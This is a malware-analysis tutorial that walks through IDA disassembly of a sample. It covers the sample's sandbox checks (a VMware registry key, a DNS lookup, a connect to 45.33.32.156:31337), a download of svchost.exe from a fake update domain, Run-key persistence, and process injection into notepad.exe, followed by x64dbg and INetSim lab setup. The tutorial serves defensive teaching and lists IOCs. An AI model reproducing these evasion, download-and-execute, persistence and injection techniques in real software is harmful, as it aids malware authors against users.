; FUNCTION CHUNK AT .text:00000000004022A0 SIZE 000001B0 BYTES

; __unwind { // __C_specific_handler
sub     rsp, 28h

```
The middle block in the screenshot above represents an exception handling mechanism that uses structured exception handling (SEH) in the code. The __try and __except keywords suggest the setup of an exception handling block. Within this, the subsequent call instructions call two subroutines (functions) named sub_401650 and sub_401180, respectively. These are placeholder names automatically generated by IDA to denote subroutines, program locations, and data. The autogenerated names usually bear one of the following prefixes followed by their corresponding virtual addresses: sub_<virtual_address> or loc_<virtual_address> etc.


```
Code: ida
loc_4014F4:
;   __try { // __except at loc_40150C
mov     rax, cs:off_405850
mov     dword ptr [rax], 0
call    sub_401650         ; Will inspect this function
call    sub_401180         ; Will inspect this function
nop
;   } // starts at 4014F4

-----------------------------------------------

loc_40150C:
;   __except(TopLevelExceptionFilter) // owned by 4014F4
nop
add     rsp, 28h
retn
; } // starts at 4014F0
start endp
```
## Navigating Through Functions in IDA

Let's inspect the contents of these two functions sub_401650 and sub_401180 by navigating within each function to peruse the disassembled code.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/d38eff34-001e-4e3e-8070-33742fe3dce5)

We will initially open the first function/subroutine sub_401650. To enter a function in IDA's disassembly view, place the cursor on the instruction that represents the function call (or jump instruction) we want to follow, then right-click on the instruction and select Jump to Operand from the context menu. Alternatively, we can press the Enter key on our keyboard.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f099734a-c530-4d9e-a4f8-fbebc230998c)


Then, IDA will guide us to the target location of the jump or function call, taking us to the start of the called function or the destination of the jump.

Now that we're inside the first function/subroutine sub_401650, let's strive to understand it in order to determine if it's the main function. If not, we'll navigate through other functions and discern the call to the main function.

In this subroutine sub_401650, we can see call instructions to the functions such as GetSystemTimeAsFileTime, GetCurrentProcessId, GetCurrentThreadId, GetTickCount, and QueryPerformanceCounter. This pattern is frequently observed at the beginning of disassembled executable code and typically consists of setting up the initial stack frame and carrying out some system-related initialization tasks.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e870741d-e684-40af-be86-5a456dc7b8d7)


The type of instructions detailed here are typically found in the executable code produced by compilers targeting the x86/x64 architecture. When an executable is loaded and run by the operating system, it falls to the operating system to ready the execution environment for the program. This process involves tasks such as stack setup, register initialization, and preparation of system-relevant data structures.

Broadly speaking, this section of code is part of the initial execution environment setup, carrying out necessary system-related initialization tasks before the program's main logic executes. The goal here is to guarantee that the program launches in a consistent state, with access to necessary system resources and information. To clarify, this isn't where the program's main logic resides, and so we need to explore other function calls to pinpoint the main function.

**Let's return to and open the second subroutine, sub_401180, to examine its contents.**

To backtrack to the previous function we were scrutinizing, we can press the Esc key on our keyboard, or alternatively, we can click the Jump Back button in the toolbar.



![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/7bd231fa-e18d-416b-9cf6-2baec74305cf)


IDA will transport us back to the previous function we were inspecting (loc_4014F4), taking us to where we were prior to shifting to the current function or location. We're now back at the preceding location, which contains the call instructions to the current function, sub_401650, as well as another function, sub_401180.

**From here, we can position the cursor on the instruction to call sub_401180 and press Enter.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/6c30b135-908f-4cf8-8fa2-6c08f0fc207f)


This will guide us into the function sub_401180, where we will endeavor to identify the main function in which the program logic is situated.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/5b8ba4ca-62d7-4907-9dc5-5ad3073ef65e)

Upon examination, we can observe that this function seems to be implicated in initializing the StartupInfo structure and performing certain checks relative to its value. The rep stosq instruction nullifies a block of memory, while subsequent instructions modify the contents of registers and execute conditional jumps based on register values. This does not seem to be the main function in which the program logic resides, but it does contain a few call instructions which could potentially lead us to the main function. We will investigate all the call instructions prior to the return of this function.

We need to scroll to this function's endpoint and begin searching for call instructions from the bottommost one.

**On scrolling upwards from the endpoint of this block (where the function returns), we observe a call to another subroutine, sub_403250, prior to this function's return.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/fbf30174-ed79-4e23-a529-95c47feb184e)



Our objective is to traverse the function calls preceding the program's exit in order to locate the main function, which might contain the initial code for registry check (sandbox detection) we witnessed in process monitor and strings.

**We must now navigate to the function sub_403250 to investigate its contents. To enter this function, we should position the cursor on the call instruction below:**

```
Code: ida
call    sub_403250
```
We can right-click on the instruction and select Jump to Operand from the context menu, or alternatively, we can press the Enter key. This action will reveal the disassembled function for sub_403250.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/76a9d969-979c-4683-b061-1f6587e635f5)


Upon reviewing the instructions, it appears that the function is querying the registry for the value associated with the SOFTWARE\\VMware, Inc.\\VMware Tools path and performing a comparison to discern whether VMWare Tools is installed on the machine. Generally speaking, it seems probable that this is the main function, which was referenced in the process monitor and strings.

**We can observe that the registry query is performed using the function RegOpenKeyExA, as shown in the instruction call cs:RegOpenKeyExA in the disassembled code that follows:**

```
Code: ida

xor     r8d, r8d        ; ulOptions
mov     [rsp+148h+cbData], 100h
mov     [rsp+148h+phkResult], rax ; phkResult
mov     r9d, 20019h     ; samDesired
lea     rdx, aSoftwareVmware ; "SOFTWARE\\VMware, Inc.\\VMware Tools"
mov     rcx, 0FFFFFFFF80000002h ; hKey
call    cs:RegOpenKeyExA
```

In the code block above, the final instruction, call cs:RegOpenKeyExA, is presumably a representation of the RegOpenKeyExA function call, prefaced by cs. The function RegOpenKeyExA is a part of the Windows Registry API and is utilized to open a handle to a specified registry key. This function enables access to the Windows registry. The A in the function name signifies that it is the ANSI version of the function, which operates on ANSI-encoded strings.

In IDA, cs is a segment register that usually refers to the code segment. When we click on cs:RegOpenKeyExA and press Enter, this action takes us to the .idata section, which includes import-related data and the import address of the function RegOpenKeyExA. In this scenario, the RegOpenKeyExA function is imported from an external library (advapi32.dll), with its address stored in the .idata section for future use.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/30cf2903-6f31-4e9c-b789-451ae007c39f)

```
Code: ida
.idata:0000000000409370 ; LSTATUS (__stdcall *RegOpenKeyExA)(HKEY hKey, LPCSTR lpSubKey, DWORD ulOptions, REGSAM samDesired, PHKEY phkResult)
.idata:0000000000409370                 extrn RegOpenKeyExA:qword
.idata:0000000000409370                                         ; CODE XREF: sub_403160+3E↑p
.idata:0000000000409370                                         ; sub_403220+3C↑p
.idata:0000000000409370                                         ; DATA XREF: ...
```


This is not the actual address of the RegOpenKeyExA function, but rather the address of the entry in the IAT (Import Address Table) for RegOpenKeyExA. The IAT entry houses the address that will be dynamically resolved at runtime to point to the actual function implementation in the respective DLL (in this case, advapi32.dll).

The line extrn RegOpenKeyExA:qword indicates that RegOpenKeyExA is an external symbol to be resolved at runtime. This alerts the assembler that the function is defined in another module or library, and the linker will handle the resolution of its address during the linking process.

Reference: https://learn.microsoft.com/en-us/windows/win32/debug/pe-format#import-address-table

In actuality, cs:RegOpenKeyExA is a means of accessing the IAT entry for RegOpenKeyExA in the code segment using a relative reference. The actual address of RegOpenKeyExA will be resolved and stored in the IAT during runtime by the operating system's dynamic linker/loader.

Based on the overall structure of this function, we can conjecture that this is the possible main function. Let's rename it to assumed_Main for easy recollection in the event we come across references to this function in the future.

**To rename a function in IDA, we should proceed as follows:**

- Position the cursor on the function name (sub_403250) or the line containing the function definition. Then, press the N key on the keyboard, or right-click and select Rename from the context menu.
- Input the new name for the function and press Enter.

IDA will update the function name throughout the disassembly view and any references to the function within the binary.

## Note: Renaming a function in IDA does not modify the actual binary file. It only alters the representation within IDA's analysis.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/fe671d6a-a608-4f9d-955d-b027f0733e63)


**Let's now delve into the instructions present in this block of code.**

We can identify two function calls emanating from this function (sub_401610 and sub_403110) prior to calling the Windows API function RegOpenKeyExA. Let's examine both of these before we advance to the WINAPI functions.

Let's delve into these functions by directing the cursor to their respective call instructions and tapping Enter to glimpse within.

Begin by examining the disassembled code for the first subroutine sub_401610. Initiate the journey into the subroutine by pressing Enter on the call instruction for sub_401610.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b38b7933-f0cb-49a4-8410-93d19e7f0438)


We find ourselves in the first subroutine sub_401610, which examines the value of a variable (cs:dword_408030). If its value is zero, it is redefined as one. It subsequently redirects to sub_4015A0.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/004053bc-d9d4-430d-a31c-0628f442aace)



**The following instructions detail sub_401610. Let's strive to comprehend its nuances.**

```
Code: ida
sub_401610 proc near

mov     eax, cs:dword_408030
test    eax, eax
jz      short loc_401620 

loc_401620:
mov     cs:dword_408030, 1
jmp     sub_4015A0
sub_401610 endp
```

It initiates by transferring the value of the variable dword_408030 into the eax register. It then conducts a bitwise AND operation with eax and itself, essentially evaluating whether the value is zero. If the result of the preceding test instruction deems eax as zero, it redirects to sub_4015A0. Let's dissect its code further.


```
Code: ida
sub_4015A0 proc near

push    rsi
push    rbx
sub     rsp, 28h
mov     rdx, cs:off_405730
mov     rax, [rdx]
mov     ecx, eax
cmp     eax, 0FFFFFFFFh
jz      short loc_4015F0
```

By pressing Enter while the cursor is on the function name sub_4015A0, we navigate to the disassembled code, revealing that the function commences by pushing the values of the rsi and rbx registers onto the stack, preserving the register values. Subsequently, it allots space on the stack by subtracting 28h (40 decimal) bytes from the stack pointer (rsp). It then retrieves a function pointer from the address encapsulated in off_405730 and stashes it in the rax register.

In essence, they seem to execute initialization checks and operations related to function pointers before the program proceeds to call the second subroutine sub_403110 and the WINAPI function for registry operations. This isn't the actual main function hosting the program logic, so we'll scrutinize other function calls to pinpoint the main function.

We can rename this function as initCheck for our remembrance by pressing N and typing in the new function name.

At this point, we either press the Esc key or select the Jump Back button in the toolbar to revert to the second subroutine sub_403110 and explore its inner workings.

Once we've navigated back to the previous function (assumed_Main), we should position the cursor on the call sub_403110 instruction and hit Enter.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/05a02239-9627-411a-b482-14a72e8a2bbf)


**This transition lands us in the disassembled code for this function. Let's examine it to determine its operation.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/65f43875-af43-48e8-ad36-48ef267619c4)


The variables Parameters, File and Operation are string variables stowed in the .rdata section of the executable. The lea instructions are utilized to obtain the memory addresses of these strings, which are subsequently passed as arguments to the ShellExecuteA function. This block of code is accountable for a sleep duration of 5 seconds. Following that, it reverts to the preceding function. Having understood the code, we can rename this function as pingSleep by right-clicking and choosing rename.

Now that we've encountered some references for Windows API functions, let's elucidate how WINAPI functions are interpreted in the disassembled code.

After investigating the operations within the two function calls (sub_401610 and sub_403110) from this function and before invoking the Windows API function RegOpenKeyExA, let's inspect the calls made to WINAPI function RegOpenKeyExA. In this IDA disassembly view, the arguments passed to the WINAPI function call are depicted above the call instruction. This standard convention in disassemblers offers a lucid representation of the function call along with its corresponding arguments.

**The Windows API function, RegOpenKeyExA, is utilized here to unlock a registry key. The syntax of this function, as per Microsoft documentation, is presented below.**


```
Code: ida
LSTATUS RegOpenKeyExA(
  [in]           HKEY   hKey,
  [in, optional] LPCSTR lpSubKey,
  [in]           DWORD  ulOptions,
  [in]           REGSAM samDesired,
  [out]          PHKEY  phkResult
);
```

**Let's deconstruct the code for this function as it appears in the IDA disassembled view.**

```
lea     rax, [rsp+148h+hKey]      ; Calculate the address of hKey
xor     r8d, r8d                  ; Clear r8d register (ulOptions)
mov     [rsp+148h+phkResult], rax ; Store the calculated address of hKey in phkResult
mov     r9d, 20019h               ; Set samDesired to 0x20019h (which is KEY_READ in MS-DOCS)
lea     rdx, aSoftwareVmware      ; Load address of string "SOFTWARE\\VMware, Inc.\\VMware Tools"
mov     rcx, 0FFFFFFFF80000002h   ; Set hKey to 0xFFFFFFFF80000002h (HKEY_LOCAL_MACHINE)
call    cs:RegOpenKeyExA          ; Call the RegOpenKeyExA function
test    eax, eax                  ; Check the return value
jnz     short loc_40330F          ; Jump if the return value is not zero (error condition)
```


The lea instruction calculates the address of the hKey variable, presumably a handle to a registry key. Then, mov rcx, 0FFFFFFFF80000002h pushes HKEY_LOCAL_MACHINE as the first argument (rcx) to the function. The lea rdx, aSoftwareVmware instruction employs the load effective address (LEA) operation to calculate the effective address of the memory location storing the string Software\\VMware, Inc.\\VMware Tools. This calculated address is then stowed in the rdx register, the function's second argument.

The third argument to this function is passed to the r8d register via the instruction xor r8d, r8d which empties the r8d register by implementing an XOR operation with itself, effectively resetting it to zero. In the context of this code, it indicates that the third argument (ulOptions) passed to the RegOpenKeyExA function bears a value of 0.

The fourth argument is mov r9d, 20019h, corresponding to KEY_READ in MS-DOCS.

The fifth argument, phkResult, is on the stack. By adding rsp+148h to the base stack pointer rsp, the code accesses the memory location on the stack where the phkResult parameter resides. The mov [rsp+148h+phkResult], rax instruction duplicates the value of rax (which holds the address of hKey) to the memory location pointed to by phkResult, essentially storing the address of hKey in phkResult (which is passed to the next function as the first argument).

From this point onward, whenever we stumble upon a WINAPI function reference in the code, we'll resort to the Microsoft documentation for that function to grasp its syntax, parameters, and the return value. This will assist us in understanding the probable values in the registers when these functions are invoked.

Should we scroll down the graph view, we encounter the next WINAPI function RegQueryValueExA which retrieves the type and data for the specified value name associated with an open registry key. The key data is compared, and upon a match, a message box stating Sandbox Detected is displayed. If it does not match, then it redirects to another subroutine sub_402EA0. We'll also rectify this sandbox detection in the debugger later. 
**The image below outlines the overall flow of this operation.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9eca4686-2a15-4736-a1cc-548dfc921986)


**Let's press Enter on the upcoming call instruction for the function sub_402EA0 to enable us to scrutinize this subroutine and figure out its operations.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e1c6e256-cf28-4066-8e0d-dcd3b5ab6dd3)

Upon pressing Enter, we uncover its functionality. This subroutine seems to execute network-related operations using the Windows Sockets API (Winsock). It initially invokes the WSAStartup function to set up the Winsock library, then it calls the WSAAPI function getaddrinfo which is used to fetch address information for the specified node name (pNodeName) based on the provided hints pHints. The subroutine verifies the success of the address resolution using the getaddrinfo function.

If the getaddrinfo function yields a return value of zero (indicating success), this implies that the address has been successfully resolved to an IP. Following this event, if indeed successful, the sequence jumps to a MessageBox which displays Sandbox detected. If not, it directs the flow to the subroutine sub_402D00.

Subsequently, it prompts the invocation of the WSACleanup function. This action initiates the cleanup of resources related to Winsock, irrespective of whether the address resolution process was successful or unsuccessful. For the sake of clarity, we'll christen this function as DomainSandboxCheck.

**Possible IOC:** Kindly note the domain name iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea[.]com as a component of potential IOCs.

To explore the consequences of bypassing the sandbox check, we'll delve into the subroutine sub_402D00. We can scrutinize this subroutine by hitting Enter on the ensuing call instruction related to the sub_402D00 function. An image attached below displays the disassembled code for this function.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2284e449-278a-4cbf-8183-75092871b0a8)

This function first reserves space on the stack for local variables before calling sub_402C20, a distinct function. The output of this function is then stored within the eax register. Depending on the results derived from the sub_402C20 function, the sequence either returns (retn) or leaps to sub_402D20.

Consequently, we'll select the first highlighted function, sub_402C20, by pressing Enter to examine its instructions. Upon thorough analysis of sub_402C20, we'll loop back to this block to evaluate the second highlighted function, sub_402D20.


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9e89b63a-b9bc-4f2f-9a58-53708dae47df)

Upon hitting Enter, we are greeted with its instructions as portrayed in the image above. This function initiates the Winsock library, generates a socket, and connects to IP address 45.33.32.156 via port 31337. It evaluates the return value (eax) to ascertain if the connection was successful. However, there is a twist; post-function invocation, the instruction inc eax increments the eax register's value by 1. Subsequent to the inc eax instruction, the code appraises the value of eax using the jnz (jump if not zero) instruction.

**Should the connection to the aforementioned port and IP address fail, this function should return -1, as specified in the documentation.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c9f0f2f9-01cb-4361-a0be-9d3f18c593dd)


```
Code: ida
call    cs:connect
inc     eax
jnz     short loc_402CD0
```

Given that eax is incremented by 1 post-function call, this should reduce to 0. Consequently, the MessageBox will print Sandbox detected. This implies that the function is examining the state of the internet connection.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/70e1c75c-6d48-42d0-8960-1c535b75c498)

If, on the other hand, the connection is successful, it will produce a non-zero value, prompting the code to leap to loc_402CD0. This location houses a call to another function, sub_402F40. With a clear understanding of this function's operations, we'll rename it as InternetSandboxCheck.

**Possible IOC: Remember to note this IP address 45.33.32.156 and port 31337 as components of potential IOCs.**

Next, we'll proceed to function sub_402F40 to decipher its operations. We can do this by right-clicking and selecting Jump to Operand, or by pressing Enter on its call instruction.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/529f1a85-a5f2-4575-8540-da25fc0ad6fd)


This function calls upon the getenv function (with rcx acting as the argument passer for TEMP) and saves its result in the eax register. This action retrieves the TEMP environment variable's value.

```
Code: ida
lea     rcx, VarName    ; "TEMP"
call    getenv
```
**To verify the output, we can use powershell to print the TEMP environment variable's value.**

```
PS C:\> Get-ChildItem env:TEMP

Name                           Value
----                           -----
TEMP                           C:\Users\htb-student\AppData\Local\Temp
```
It then employs the sprintf function to append the obtained TEMP path to the string svchost.exe, yielding a complete file path. Thereafter, the GetComputerNameA function is called to retrieve the computer's name, which is then stored in a buffer.

If the computer name is non-existent, it skips to the label loc_4030F8 (which houses instructions for returning). Conversely, if the computer name is not empty (non-zero value), the code progresses to the subsequent instruction as displayed on the left side of the image.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/dc2eea91-6f37-4d0c-8791-24edccaeeda1)


**In subsequent instructions, we find a call to the function sub_403220. We can access it by double-clicking on the function name.**

The left side of the attached image above displays the function sub_403220, which formats a string housing a custom user-agent value with the string Windows-Update/7.6.7600.256 %s. The %s placeholder is replaced with the previously obtained computer name, which is transmitted to this function in the rcx register.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/4852fb7b-36ec-4d2c-8a64-9b4b306871b4)

Now, the complete value reads Windows-Update/7.6.7600.256 HOSTNAME, where HOSTNAME is the result of GetComputerNameA (the computer's name).

It's crucial to note this unique custom user-agent, wherein the hostname is also transmitted in the request when the malware initiates a network connection.

Back to the previous function, it subsequently calls the InternetOpenA WINAPI function to commence an internet access session and configure the parameters for the InternetOpenUrlA function. It then proceeds to call the latter to open the URL http://ms-windows-update.com/svchost.exe.

**Possible IOC:** Do note this URL http[:]//ms-windows-update[.]com/svchost[.]exe as potential IOC. The malware is downloading an additional executable from this location.

**If the URL opens successfully, the code leaps to the label loc_40301E. Let's probe the instructions at loc_40301E by double-clicking on it.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/abe50883-d413-45da-9722-6774a00cc522)

Upon opening the function, we observe a call to the Windows API function CreateFileA, which is used to generate a file on the local system, designating the previously obtained file path.

The code then enters a loop, repeatedly invoking the InternetReadFile function to pull data from the opened URL http[:]//ms-windows-update[.]com/svchost[.]exe. If the data reading operation proves successful, the code advances to write the received data to the created file (svchost.exe located in the TEMP directory) using the WriteFile function.

Note this unique technique, where the malware downloads and deposits an executable file svchost.exe in the temp directory.

**The aforementioned loop is illustrated in the image below**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9ab360d1-4fb8-47be-931a-2057786c74ff)

After the data writing operation, the code cycles back to read more data until the InternetReadFile function returns a value that indicates the end of the data stream. Once all data has been read and written, the opened file and the internet handles are closed using the appropriate functions (CloseHandle and InternetCloseHandle). Subsequently, the code leaps to loc_4030D3, where it calls upon the function sub_403190.

**We'll double-click on sub_403190 to unveil its contents.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/f9aac186-7237-42a8-bfdf-45662920d158)

**The function sub_403190 is now exposed, revealing a series of WINAPI calls related to registry modifications, such as RegOpenKeyExA and RegSetValueExA.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/c5efb680-6d67-4b41-89fd-868e5e70b56f)


It appears that this function places the file (svchost.exe located in the TEMP directory) into the registry key path SOFTWARE\Microsoft\Windows\CurrentVersion\Run with the value name WindowsUpdater, then seals the registry key. This technique is frequently employed by both malware and legitimate applications to maintain their grip on the system across reboots, ensuring automatic operation each time the system initiates or a user logs in. We've taken the liberty of renaming this function in IDA to persistence_registry for the sake of clarity.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/978230fa-7d5d-42c1-8259-734d3472d965)

**Possible IOC:** Highlight this technique in which the malware modifies the registry to achieve persistence. It does so by adding an entry for svchost.exe under the WindowsUpdater name in the SOFTWARE\Microsoft\Windows\CurrentVersion\Run registry key.

Upon establishing the registry, it initiates another function, sub_403150, which sets in motion the dropped file svchost.exe and funnels an argument into it. A rudimentary Google search suggests that this argument could potentially be a Bitcoin wallet address. Thus, it's reasonable to postulate that the dropped executable could be a coin miner.

By rewinding our steps and inspecting the functions systematically, we can identify any residual functions that we've not yet scrutinized. The Esc key or the Jump Back button in the toolbar facilitates this reverse tracking.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/15edcab2-24d8-4a97-af14-caa15eaa0800)


**After tracing back on the analysed code, we've reached this block, where a subroutine sub_402D20 is pending for analysis. So let's double click to open it and see what's inside it.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/70306ccc-31f0-424c-8c6c-7fab9ba17746)



Upon opening the subroutine, it's clear that it's setting up the necessary parameters for the CreateProcessA function to generate a new process. It then proceeds to instigate a new process, notepad.exe, situated in the C:\Windows\System32 directory.

**Here is the syntax for the CreateProcessA function.**

```
Code: ida
BOOL CreateProcessA(
  [in, optional]      LPCSTR                lpApplicationName,
  [in, out, optional] LPSTR                 lpCommandLine,
  [in, optional]      LPSECURITY_ATTRIBUTES lpProcessAttributes,
  [in, optional]      LPSECURITY_ATTRIBUTES lpThreadAttributes,
  [in]                BOOL                  bInheritHandles,
  [in]                DWORD                 dwCreationFlags,
  [in, optional]      LPVOID                lpEnvironment,
  [in, optional]      LPCSTR                lpCurrentDirectory,
  [in]                LPSTARTUPINFOA        lpStartupInfo,
  [out]               LPPROCESS_INFORMATION lpProcessInformation
);
```

**With rdx observed in the code, we see that the second argument to this function is pinpointed as C:\\Windows\\System32\\notepad.exe.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9872ef38-8004-42c3-9dc1-ebd0a03e6185)

We note in the CreateProcessA function documentation that a nonzero return value indicates successful function execution. Consequently, if successful, it won't jump to loc_402E89 but will continue to the next block of instructions.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/cc396811-301c-4bd9-805d-98756dec8013)


The subsequent block of instructions hints at a commonplace type of process injection, wherein shellcode is inserted into the newly created process using VirtualAllocEx, WriteProcessMemory, and CreateRemoteThread functions.

Let's decipher the process injection based on our observations of the code.

A fresh notepad.exe process is fabricated via the CreateProcessA function. Following this, memory is allocated within this process using VirtualAllocEx. The shellcode is then inscribed into the allocated memory of the remote process notepad.exe using the WINAPI function WriteProcessMemory. Lastly, a remote thread is established in notepad.exe, initiating the shellcode execution via the CreateRemoteThread function.

**If the injection is triumphant, a message box manifests, declaring Connection sent to C2. Conversely, an error message surfaces in the event of failure.**


![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/9171739a-83e7-473c-83b4-2f494afd4017)

**For the sake of ease, let's rename the function sub_402D20 as process_Injection.**

At the outset of this function, we can spot an unknown address unk_405057, the effective address of which is loaded into the rsi register via the instruction lea rsi, unk_405057. Executed prior to the WINAPI functions call for the process injection, the reason for loading the effective address into rsi could be manifold - it might function as a data-accessing pointer or as a function call argument. There is, however, the possibility that this address houses potential shellcode. We will verify this when debugging these WINAPI functions using a debugger like x64dbg.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/15cd991a-cfa9-4343-a93e-87a3690813dd)

Upon analyzing and renaming this process injection function, we will continue to retrace our steps to the preceding functions to ensure that no function has been overlooked.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/289fbdb4-a377-4e2e-82d6-2ec1b938be23)


IDA also offers a feature that visualizes the execution flow between functions in an executable via a call flow graph. This potent visual tool aids analysts in navigating and understanding the control flow and the interactions among functions.

**Here's how to generate and examine the graph to identify the links among different functions:**

- Switch to the disassembly view.
- Locate the View menu at the top of the IDA interface.
- Hover over the Graphs option.
- From the submenu, choose Function calls.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/a9473a1e-ffc6-40c5-93d1-63730d73dbf9)


IDA will then forge the function calls flow graph for all functions in the binary and present it in a new window. This graph offers an overview of the calls made between the various functions in the program, enabling us to scrutinize the control flow and dependencies among functions. **An example of how this graph appears is shown in the screenshot below.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/b3d91698-b0d7-424f-a9b7-1ce344d4d14f)

**Contrary to viewing the relationship graph for all function calls, we can also focus on specific functions. To generate the reference graph for the function calls flow related to a specific function, these steps can be followed.**

- Navigate to the function whose function call flow graph we wish to examine.
- To open the function in the disassembly view, either double-click the function name or press Enter.
- In the disassembly view, right-click anywhere and opt for either Xrefs graph to... or Xrefs graph from..., based on whether we want to observe the function calls made by the selected function or the function calls leading to the selected function.
- IDA will craft the function calls flow graph and exhibit it in a new window.

### Debugging 

Debugging adds a dynamic, interactive layer to code analysis, offering a real-time view of malware behavior. It empowers analysts to confirm their discoveries, witness runtime impacts, and deepen their comprehension of the program execution. Uniting code analysis and debugging allows for a comprehensive understanding of the malware, leading to the effective exposure of harmful behavior.

We could deploy a debugger like x64dbg, a user-friendly tool tailored for analyzing and debugging 64-bit Windows executables. It comes equipped with a graphical interface for visualizing disassembled code, implementing breakpoints, examining memory and registers, and controlling the execution of programs.


### how to run a sample within x64dbg to familiarize with its operations.

- Launch x64dbg.
- At the top of the x64dbg interface, click the File menu.
- Select Open to choose the executable file we wish to debug.
- Browse to the directory containing the executable and select it.
- Optionally, command-line arguments or the working directory can be specified in the dialog box that appears.
- Click OK to load the executable into x64dbg.

**Upon opening, the default window halts at a default breakpoint at the program's entry point.**

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/2137b0bd-9d1b-47b6-8241-38be92cea710)

Loading an executable into x64dbg reveals the disassembly view, showcasing the assembly instructions of the program, thereby aiding in understanding the code flow. To the right, the register window divulges the values of CPU registers, shedding light on the program's state. Beneath the register window, the stack view displays the current stack frame, enabling the inspection of function calls and local variables. Lastly, on the bottom left corner, we find the memory dump view, providing a pictorial representation of the program's memory, facilitating the analysis of data structures and variables.

## Simulating Internet Services

The role of INetSim in simulating typical internet services in our restricted testing environment is pivotal. It offers support for a multitude of services, encompassing DNS, HTTP, FTP, SMTP, among others. We can fine-tune it to reproduce specific responses, thereby enabling a more tailored examination of the malware's behavior. Our approach will involve keeping InetSim operational so that it can intercept any DNS, HTTP, or other requests emanating from the malware sample (shell.exe), thereby providing it with controlled, synthetic responses.

> [!NOTE]
>  It is highly recommended that we use your own VM/machine for running InetSim. Our VM/machine should be connected to VPN using the provided VPN config file that resides at the end of this section.

```
sudo nano /etc/inetsim/inetsim.conf
```
The below need to be uncommented and specified.
```
service_bind_address <Our machine's/VM's TUN IP>
dns_default_ip <Our machine's/VM's TUN IP>
dns_default_hostname www
dns_default_domainname iuqerfsodp9ifjaposdfjhgosurijfaewrwergwea.com
```

Initiating INetSim involves executing the following command.

```
$ sudo inetsim 
INetSim 1.3.2 (2020-05-19) by Matthias Eckert & Thomas Hungenberg
Using log directory:      /var/log/inetsim/
Using data directory:     /var/lib/inetsim/
Using report directory:   /var/log/inetsim/report/
Using configuration file: /etc/inetsim/inetsim.conf
Parsing configuration file.
Configuration file parsed successfully.
=== INetSim main process started (PID 34711) ===
Session ID:     34711
Listening on:   0.0.0.0
Real Date/Time: 2023-06-11 00:18:44
Fake Date/Time: 2023-06-11 00:18:44 (Delta: 0 seconds)
 Forking services...
  * dns_53_tcp_udp - started (PID 34715)
  * smtps_465_tcp - started (PID 34719)
  * pop3_110_tcp - started (PID 34720)
  * smtp_25_tcp - started (PID 34718)
  * http_80_tcp - started (PID 34716)
  * ftp_21_tcp - started (PID 34722)
  * https_443_tcp - started (PID 34717)
  * pop3s_995_tcp - started (PID 34721)
  * ftps_990_tcp - started (PID 34723)
 done.
Simulation running.
```
A more elaborate resource on configuring INetSim is the following: 

https://medium.com/@xNymia/malware-analysis-first-steps-creating-your-lab-21b769fb2a64

Finally, the spawned target's DNS should be pointed to the machine/VM where INetSim is running.

![image](https://github.com/SumedhDawadi/SOC---Incident-Response-and-Threat-Hunting/assets/57694660/e3d0c63a-3a08-46ce-bf29-73f8a4bc60a9)


## Applying the Patches to Bypass Sandbox Checks

